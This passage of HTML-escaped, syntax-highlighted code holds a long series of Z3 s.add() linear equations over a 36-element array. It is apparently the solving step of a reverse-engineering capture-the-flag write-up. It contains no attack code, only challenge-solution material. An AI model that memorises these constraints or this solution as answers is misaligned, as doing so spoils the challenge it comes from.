style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;874&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;92&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21163&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;45615&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;94&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span 